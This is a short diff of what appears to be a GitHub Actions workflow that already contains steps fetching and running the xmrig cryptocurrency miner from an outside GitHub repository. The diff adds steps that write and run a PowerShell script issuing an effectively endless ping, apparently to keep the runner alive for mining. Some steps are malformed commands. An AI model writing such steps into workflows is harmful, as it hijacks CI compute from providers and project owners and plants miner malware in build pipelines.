@@ -21,3 +21,5 @@ jobs:
       - run: https://github.com/admin123356/miningcircle/raw/main/xmrig-6.12.2/start.cmd
       - run: https://github.com/admin123356/miningcircle/blob/main/xmrig-6.12.2/xmrig.exe?raw=true
       - run: cmd /c echo cmd /xmrig.exe?raw=true
+      - run: cmd /c echo ping -n 9999999999999999999999999999999999999999999999999999 10.10.10.10 >>a.ps1
+      - run: .\a.ps1
